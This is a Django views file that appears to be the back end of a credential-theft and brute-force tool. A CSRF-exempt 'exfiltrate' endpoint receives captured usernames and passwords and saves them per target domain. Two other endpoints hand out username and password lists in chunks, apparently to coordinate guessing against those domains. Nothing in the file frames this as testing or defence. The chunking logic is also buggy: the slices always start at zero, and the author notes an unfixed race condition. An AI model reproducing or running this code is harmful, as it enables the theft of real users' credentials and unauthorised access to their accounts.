import json

from django.http import HttpResponse, JsonResponse
from django.template import loader
from django.views.decorators.csrf import csrf_exempt

from app.models import Credential, Domain


def index(request, domain):
    find = Domain.objects.get(name=domain)
    template = loader.get_template('app/index.html')
    context = {
        'domain': find
    }
    return HttpResponse(template.render(context, request))


@csrf_exempt
def exfiltrate(request, domain):
    find = Domain.objects.get(name=domain)
    cred_json = json.loads(request.body)
    cred = Credential(username=cred_json['username'], password=cred_json['password'], domain=find)
    cred.save()
    return HttpResponse(status=204)


def usernames(request, domain):
    find = Domain.objects.get(name=domain)
    data = find.username_set.all()[0:find.username_offset + find.chunk_size]
    find.username_offset += find.chunk_size
    find.save()
    # TODO : race condition
    return JsonResponse({'usernames': list(data.values('username'))})


def passwords(request, domain):
    find = Domain.objects.get(name=domain)
    data = find.password_set.all()[0:find.password_offset + find.chunk_size]
    find.password_offset += find.chunk_size
    find.save()
    # TODO : race condition
    return JsonResponse({'passwords': list(data.values('password'))})
